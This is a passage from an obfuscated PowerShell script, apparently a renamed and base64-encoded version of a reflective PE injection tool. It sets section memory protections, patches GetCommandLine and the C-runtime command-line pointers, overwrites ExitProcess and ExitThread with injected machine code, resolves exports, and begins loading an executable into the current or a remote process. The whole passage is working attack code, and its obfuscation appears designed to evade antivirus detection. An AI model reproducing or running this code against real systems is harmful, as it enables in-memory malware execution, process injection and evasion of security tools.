				if ((${_10110000101110100} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${10011001110110011} = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					${10011001110110011} = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if ((${_10110000101110100} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${10011001110110011} = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					${10011001110110011} = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if ((${_10110000101110100} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${_10110000101110100} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${10011001110110011} = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					${10011001110110011} = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if ((${_10110000101110100} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${10011001110110011} = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					${10011001110110011} = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		if ((${_10110000101110100} -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			${10011001110110011} = ${10011001110110011} -bor $Win32Constants.PAGE_NOCACHE
		}
		return ${10011001110110011}
	}
	Function _10001010111000000
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${_00101101001101101},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${00011111101110101} = 0; ${00011111101110101} -lt ${_00101101001101101}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${00011111101110101}++)
		{
			[IntPtr]${00001111011100110} = [IntPtr](_01100001001101001 ([Int64]${_00101101001101101}.SectionHeaderPtr) (${00011111101110101} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${10110001111001110} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00001111011100110}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${01101001001110010} = _01100001001101001 (${_00101101001101101}.PEHandle) (${10110001111001110}.VirtualAddress)
			[UInt32]${10000001000000111} = _10100100111110100 ${10110001111001110}.Characteristics
			[UInt32]${01001101001100010} = ${10110001111001110}.VirtualSize
			[UInt32]${10110111111010000} = 0
			_00101100110101100 -_10101101101010011 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUALQBNAGUAbQBvAHIAeQBQAHIAbwB0AGUAYwB0AGkAbwBuAEYAbABhAGcAcwA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0AA=='))) -_00101101001101101 ${_00101101001101101} -_10100000001011100 ${01101001001110010} -_01001110000011110 ${01001101001100010} | Out-Null
			${01110110101110011} = $Win32Functions.VirtualProtect.Invoke(${01101001001110010}, ${01001101001100010}, ${10000001000000111}, [Ref]${10110111111010000})
			if (${01110110101110011} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGgAYQBuAGcAZQAgAG0AZQBtAG8AcgB5ACAAcAByAG8AdABlAGMAdABpAG8AbgA=')))
			}
		}
	}
	Function _10111000001011101
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${_00101101001101101},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${_00000100011000010},
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		${_01110001100000111}
		)
		${01000011111111111} = @() 
		${10000101110111000} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]${10110111111010000} = 0
		[IntPtr]${10100100001100110} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		if (${10100100001100110} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyACAAaABhAG4AZABsAGUAIABuAHUAbABsAA==')))
		}
		[IntPtr]${01000110111100100} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAuAGQAbABsAA=='))))
		if (${01000110111100100} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		${10010010101001001} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${_00000100011000010})
		${00000000111100111} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${_00000100011000010})
		[IntPtr]${01111011011110010} = $Win32Functions.GetProcAddress.Invoke(${01000110111100100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAEEA'))))
		[IntPtr]${01110011001011000} = $Win32Functions.GetProcAddress.Invoke(${01000110111100100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAFcA'))))
		if (${01111011011110010} -eq [IntPtr]::Zero -or ${01110011001011000} -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(_01101110011100000 ${01111011011110010}). GetCommandLineW: $(_01101110011100000 ${01110011001011000})"
		}
		[Byte[]]${01111110010100100} = @()
		if (${10000101110111000} -eq 8)
		{
			${01111110010100100} += 0x48	
		}
		${01111110010100100} += 0xb8
		[Byte[]]${01010101110101011} = @(0xc3)
		${10011100001010001} = ${01111110010100100}.Length + ${10000101110111000} + ${01010101110101011}.Length
		${00100001110001110} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10011100001010001})
		${01010111110010001} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10011100001010001})
		$Win32Functions.memcpy.Invoke(${00100001110001110}, ${01111011011110010}, [UInt64]${10011100001010001}) | Out-Null
		$Win32Functions.memcpy.Invoke(${01010111110010001}, ${01110011001011000}, [UInt64]${10011100001010001}) | Out-Null
		${01000011111111111} += ,(${01111011011110010}, ${00100001110001110}, ${10011100001010001})
		${01000011111111111} += ,(${01110011001011000}, ${01010111110010001}, ${10011100001010001})
		[UInt32]${10110111111010000} = 0
		${01110110101110011} = $Win32Functions.VirtualProtect.Invoke(${01111011011110010}, [UInt32]${10011100001010001}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${10110111111010000})
		if (${01110110101110011} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${01011011011101001} = ${01111011011110010}
		_00000100110100000 -_01111011100010111 ${01111110010100100} -_10100011101010110 ${01011011011101001}
		${01011011011101001} = _01100001001101001 ${01011011011101001} (${01111110010100100}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${00000000111100111}, ${01011011011101001}, $false)
		${01011011011101001} = _01100001001101001 ${01011011011101001} ${10000101110111000}
		_00000100110100000 -_01111011100010111 ${01010101110101011} -_10100011101010110 ${01011011011101001}
		$Win32Functions.VirtualProtect.Invoke(${01111011011110010}, [UInt32]${10011100001010001}, [UInt32]${10110111111010000}, [Ref]${10110111111010000}) | Out-Null
		[UInt32]${10110111111010000} = 0
		${01110110101110011} = $Win32Functions.VirtualProtect.Invoke(${01110011001011000}, [UInt32]${10011100001010001}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${10110111111010000})
		if (${01110110101110011} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${01101101110011010} = ${01110011001011000}
		_00000100110100000 -_01111011100010111 ${01111110010100100} -_10100011101010110 ${01101101110011010}
		${01101101110011010} = _01100001001101001 ${01101101110011010} (${01111110010100100}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${10010010101001001}, ${01101101110011010}, $false)
		${01101101110011010} = _01100001001101001 ${01101101110011010} ${10000101110111000}
		_00000100110100000 -_01111011100010111 ${01010101110101011} -_10100011101010110 ${01101101110011010}
		$Win32Functions.VirtualProtect.Invoke(${01110011001011000}, [UInt32]${10011100001010001}, [UInt32]${10110111111010000}, [Ref]${10110111111010000}) | Out-Null
		${00100001101111010} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQBkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMAAuAGQAbABsAA=='))) `
			, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAC4AZABsAGwA'))))
		foreach (${01011111101011011} in ${00100001101111010})
		{
			[IntPtr]${10100111000110101} = $Win32Functions.GetModuleHandle.Invoke(${01011111101011011})
			if (${10100111000110101} -ne [IntPtr]::Zero)
			{
				[IntPtr]${10011110011110000} = $Win32Functions.GetProcAddress.Invoke(${10100111000110101}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwB3AGMAbQBkAGwAbgA='))))
				[IntPtr]${01111100100110110} = $Win32Functions.GetProcAddress.Invoke(${10100111000110101}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBhAGMAbQBkAGwAbgA='))))
				if (${10011110011110000} -eq [IntPtr]::Zero -or ${01111100100110110} -eq [IntPtr]::Zero)
				{
					$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACwAIABjAG8AdQBsAGQAbgAnAHQAIABmAGkAbgBkACAAXwB3AGMAbQBkAGwAbgAgAG8AcgAgAF8AYQBjAG0AZABsAG4A')))
				}
				${00010100010011111} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${_00000100011000010})
				${01101011111011010} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${_00000100011000010})
				${00110111111010101} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01111100100110110}, [Type][IntPtr])
				${00001011011111000} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10011110011110000}, [Type][IntPtr])
				${00010001000010110} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10000101110111000})
				${10110001100010101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10000101110111000})
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${00110111111010101}, ${00010001000010110}, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${00001011011111000}, ${10110001100010101}, $false)
				${01000011111111111} += ,(${01111100100110110}, ${00010001000010110}, ${10000101110111000})
				${01000011111111111} += ,(${10011110011110000}, ${10110001100010101}, ${10000101110111000})
				${01110110101110011} = $Win32Functions.VirtualProtect.Invoke(${01111100100110110}, [UInt32]${10000101110111000}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${10110111111010000})
				if (${01110110101110011} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${00010100010011111}, ${01111100100110110}, $false)
				$Win32Functions.VirtualProtect.Invoke(${01111100100110110}, [UInt32]${10000101110111000}, [UInt32](${10110111111010000}), [Ref]${10110111111010000}) | Out-Null
				${01110110101110011} = $Win32Functions.VirtualProtect.Invoke(${10011110011110000}, [UInt32]${10000101110111000}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${10110111111010000})
				if (${01110110101110011} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${01101011111011010}, ${10011110011110000}, $false)
				$Win32Functions.VirtualProtect.Invoke(${10011110011110000}, [UInt32]${10000101110111000}, [UInt32](${10110111111010000}), [Ref]${10110111111010000}) | Out-Null
			}
		}
		${01000011111111111} = @()
		${00111010011110100} = @() 
		[IntPtr]${01011101101001010} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAuAGQAbABsAA=='))))
		if (${01011101101001010} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		[IntPtr]${00111100100110000} = $Win32Functions.GetProcAddress.Invoke(${01011101101001010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${00111100100110000} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${00111010011110100} += ${00111100100110000}
		[IntPtr]${01001110001000101} = $Win32Functions.GetProcAddress.Invoke(${10100100001100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${01001110001000101} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${00111010011110100} += ${01001110001000101}
		[UInt32]${10110111111010000} = 0
		foreach (${10001010101011010} in ${00111010011110100})
		{
			${10110010100110110} = ${10001010101011010}
			[Byte[]]${01111110010100100} = @(0xbb)
			[Byte[]]${01010101110101011} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if (${10000101110111000} -eq 8)
			{
				[Byte[]]${01111110010100100} = @(0x48, 0xbb)
				[Byte[]]${01010101110101011} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${10010000110111001} = @(0xff, 0xd3)
			${10011100001010001} = ${01111110010100100}.Length + ${10000101110111000} + ${01010101110101011}.Length + ${10000101110111000} + ${10010000110111001}.Length
			[IntPtr]${10111100011001010} = $Win32Functions.GetProcAddress.Invoke(${10100100001100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAA='))))
			if (${10111100011001010} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAAgAGEAZABkAHIAZQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))
			}
			${01110110101110011} = $Win32Functions.VirtualProtect.Invoke(${10001010101011010}, [UInt32]${10011100001010001}, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${10110111111010000})
			if (${01110110101110011} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			${10011101101011000} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10011100001010001})
			$Win32Functions.memcpy.Invoke(${10011101101011000}, ${10001010101011010}, [UInt64]${10011100001010001}) | Out-Null
			${01000011111111111} += ,(${10001010101011010}, ${10011101101011000}, ${10011100001010001})
			_00000100110100000 -_01111011100010111 ${01111110010100100} -_10100011101010110 ${10110010100110110}
			${10110010100110110} = _01100001001101001 ${10110010100110110} (${01111110010100100}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_01110001100000111}, ${10110010100110110}, $false)
			${10110010100110110} = _01100001001101001 ${10110010100110110} ${10000101110111000}
			_00000100110100000 -_01111011100010111 ${01010101110101011} -_10100011101010110 ${10110010100110110}
			${10110010100110110} = _01100001001101001 ${10110010100110110} (${01010101110101011}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${10111100011001010}, ${10110010100110110}, $false)
			${10110010100110110} = _01100001001101001 ${10110010100110110} ${10000101110111000}
			_00000100110100000 -_01111011100010111 ${10010000110111001} -_10100011101010110 ${10110010100110110}
			$Win32Functions.VirtualProtect.Invoke(${10001010101011010}, [UInt32]${10011100001010001}, [UInt32]${10110111111010000}, [Ref]${10110111111010000}) | Out-Null
		}
		echo ${01000011111111111}
	}
	Function _01010001000001111
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		${_00110000001111110},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[UInt32]${10110111111010000} = 0
		foreach (${10010101111010100} in ${_00110000001111110})
		{
			${01110110101110011} = $Win32Functions.VirtualProtect.Invoke(${10010101111010100}[0], [UInt32]${10010101111010100}[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${10110111111010000})
			if (${01110110101110011} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			$Win32Functions.memcpy.Invoke(${10010101111010100}[0], ${10010101111010100}[1], [UInt64]${10010101111010100}[2]) | Out-Null
			$Win32Functions.VirtualProtect.Invoke(${10010101111010100}[0], [UInt32]${10010101111010100}[2], [UInt32]${10110111111010000}, [Ref]${10110111111010000}) | Out-Null
		}
	}
	Function _01010100101101001
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${_10100111001011110},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${_01111111011000110}
		)
		$Win32Types = _01001100001111011
		$Win32Constants = _00000010000011111
		${_00101101001101101} = _01001001110001010 -_10100111001011110 ${_10100111001011110} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${_00101101001101101}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		${10110011101000000} = _01100001001101001 (${_10100111001011110}) (${_00101101001101101}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		${00111011001110111} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10110011101000000}, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		for (${00011111101110101} = 0; ${00011111101110101} -lt ${00111011001110111}.NumberOfNames; ${00011111101110101}++)
		{
			${10111101000011100} = _01100001001101001 (${_10100111001011110}) (${00111011001110111}.AddressOfNames + (${00011111101110101} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			${10101010110101001} = _01100001001101001 (${_10100111001011110}) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(${10111101000011100}, [Type][UInt32]))
			${01111101110101001} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${10101010110101001})
			if (${01111101110101001} -ceq ${_01111111011000110})
			{
				${00101100101110101} = _01100001001101001 (${_10100111001011110}) (${00111011001110111}.AddressOfNameOrdinals + (${00011111101110101} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				${00111100011101000} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00101100101110101}, [Type][UInt16])
				${01011010100101000} = _01100001001101001 (${_10100111001011110}) (${00111011001110111}.AddressOfFunctions + (${00111100011101000} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				${10101111011000101} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01011010100101000}, [Type][UInt32])
				return _01100001001101001 (${_10100111001011110}) (${10101111011000101})
			}
		}
		return [IntPtr]::Zero
	}
	Function _01001001001010111
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		${_10100101101101111},
        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		${10000101110111000} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$Win32Constants = _00000010000011111
		$Win32Functions = _00010101001110011
		$Win32Types = _01001100001111011
		${10000111110101111} = $false
		if ((${_10100101101101111} -ne $null) -and (${_10100101101101111} -ne [IntPtr]::Zero))
		{
			${10000111110101111} = $true
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGIAYQBzAGkAYwAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGYAaQBsAGUA')))
		${_00101101001101101} = _00111101101010000 -PEBytes $PEBytes -Win32Types $Win32Types
		${_00110111101011000} = ${_00101101001101101}.OriginalImageBase
		${00010100110010010} = $true
		if (([Int] ${_00101101001101101}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQAaAAgAEQARQBQACwAIABtAGkAZwBoAHQAIABjAGEAdQBzAGUAIABpAHMAcwB1AGUAcwA='))) -WarningAction Continue
			${00010100110010010} = $false
		}
		${00111110100110101} = $true
		if (${10000111110101111} -eq $true)
		{
			${10100100001100110} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
			${10010100000000000} = $Win32Functions.GetProcAddress.Invoke(${10100100001100110}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFcAbwB3ADYANABQAHIAbwBjAGUAcwBzAA=='))))
			if (${10010100000000000} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbABvAGMAYQB0AGUAIABJAHMAVwBvAHcANgA0AFAAcgBvAGMAZQBzAHMAIABmAHUAbgBjAHQAaQBvAG4AIAB0AG8AIABkAGUAdABlAHIAbQBpAG4AZQAgAGkAZgAgAHQAYQByAGcAZQB0ACAAcAByAG8AYwBlAHMAcwAgAGkAcwAgADMAMgBiAGkAdAAgAG8AcgAgADYANABiAGkAdAA=')))
			}
			[Bool]${10110010101110101} = $false
			${01110110101110011} = $Win32Functions.IsWow64Process.Invoke(${_10100101101101111}, [Ref]${10110010101110101})
			if (${01110110101110011} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEkAcwBXAG8AdwA2ADQAUAByAG8AYwBlAHMAcwAgAGYAYQBpAGwAZQBkAA==')))
			}
			if ((${10110010101110101} -eq $true) -or ((${10110010101110101} -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				${00111110100110101} = $false
			}
			${10010111100010110} = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${10010111100010110} = $false
			}
			if (${10010111100010110} -ne ${00111110100110101})
			{
				throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAG0AdQBzAHQAIABiAGUAIABzAGEAbQBlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIAAoAHgAOAA2AC8AeAA2ADQAKQAgAGEAcwAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAYQBuAGQAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMA')))
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${00111110100110101} = $false
			}
		}
		if (${00111110100110101} -ne ${_00101101001101101}.PE64Bit)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAcABsAGEAdABmAG8AcgBtACAAZABvAGUAcwBuACcAdAAgAG0AYQB0AGMAaAAgAHQAaABlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABvAGYAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABpAHQAIABpAHMAIABiAGUAaQBuAGcAIABsAG8AYQBkAGUAZAAgAGkAbgAgACgAMwAyAC8ANgA0AGIAaQB0ACkA')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAGEAdABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIAB0AGgAZQAgAFAARQAgAGEAbgBkACAAdwByAGkAdABlACAAaQB0AHMAIABoAGUAYQBkAGUAcgBzACAAdABvACAAbQBlAG0AbwByAHkA')))
		[IntPtr]${10111111001110010} = [IntPtr]::Zero
        ${01011110100110011} = ([Int] ${_00101101001101101}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not ${01011110100110011}))
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGIAZQBpAG4AZwAgAHIAZQBmAGwAZQBjAHQAaQB2AGUAbAB5ACAAbABvAGEAZABlAGQAIABpAHMAIABuAG8AdAAgAEEAUwBMAFIAIABjAG8AbQBwAGEAdABpAGIAbABlAC4AIABJAGYAIAB0AGgAZQAgAGwAbwBhAGQAaQBuAGcAIABmAGEAaQBsAHMALAAgAHQAcgB5ACAAcgBlAHMAdABhAHIAdABpAG4AZwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABhAG4AZAAgAHQAcgB5AGkAbgBnACAAYQBnAGEAaQBuACAATwBSACAAdAByAHkAIAB1AHMAaQBuAGcAIAB0AGgAZQAgAC0ARgBvAHIAYwBlAEEAUwBMAFIAIABmAGwAYQBnACAAKABjAG8AdQBsAGQAIABjAGEAdQBzAGUAIABjAHIAYQBzAGgAZQBzACkA'))) -WarningAction Continue
			[IntPtr]${10111111001110010} = ${_00110111101011000}
		}
        elseif ($ForceASLR -and (-not ${01011110100110011}))
        {
